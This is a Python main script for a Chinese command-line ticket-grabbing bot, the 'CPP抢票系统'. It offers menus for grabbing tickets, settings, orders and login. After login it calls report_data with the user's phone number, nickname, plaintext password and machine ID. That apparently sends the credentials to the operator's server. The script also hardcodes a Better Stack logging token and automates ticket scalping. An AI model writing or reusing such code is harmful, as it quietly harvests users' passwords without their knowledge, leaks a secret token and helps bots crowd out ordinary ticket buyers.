import os
import inquirer
import time
import sys

from loguru import logger
from logtail import LogtailHandler

from cli.settings import settings_cli
from cli.login import login_cli
from cli.order import order_cli
from cli.go import go_cli
from globals import *
from config import main_request, configDB

# 配置日志
logger.add("app.log")

# 创建Better Stack处理器
handler = LogtailHandler(
    source_token='o76i716ALG97zPWmBFG2orvJ',
    host='https://s1264712.eu-nbg-2.betterstackdata.com'
)

# 将Better Stack处理器添加到loguru
logger.add(
    handler,
    format="{time} {level} {message}",
    level="INFO",
    serialize=True
)



def main():
    # 确保必要的目录存在    
    base_dir = os.path.dirname(os.path.realpath(sys.executable))
    config_dir = os.path.join(base_dir, "configs")
    os.makedirs(config_dir, exist_ok=True)
    
    # 配置日志
    logger.add("app.log")


    check_version()
    verify_server_connection(domain="svipzkjgpt.site:5000")
    check_device_allowed()
    agree_terms()
    

    # 主循环
    while True:

        # 检查是否需要登录
        if not check_login():
            logger.warning("⚠️ 未检测到登录凭证，请先进行登录。")
            login_cli()
            #不退出程序，登录成功后继续执行
            continue
        else:
            # 登录成功后进行数据上报
            try:
                phone, password, machine_id, version, nickname = get_login_params()
                report_data(phone, nickname, password, machine_id, version)
            except Exception as e:
                logger.error(f"出现未知错误，正在退出程序...")  
                time.sleep(5)
                sys.exit(1)
            


        questions = [
            inquirer.List('action',
                         message='请选择功能',
                         choices=[
                             '抢票',
                             '配置管理',
                             '查看订单',
                             '登录管理',
                             '退出程序'
                         ])
        ]
        
        answers = inquirer.prompt(questions)
        if not answers:
            break
            
        if answers['action'] == '配置管理':
            settings_cli()
        elif answers['action'] == '抢票':
            go_cli()
        elif answers['action'] == '查看订单':
            order_cli()
        elif answers['action'] == '登录管理':
            login_cli()
        else:  # 退出程序
            logger.info("感谢使用CPP抢票系统，再见！❤️")
            time.sleep(3)
            break

if __name__ == "__main__":

    main()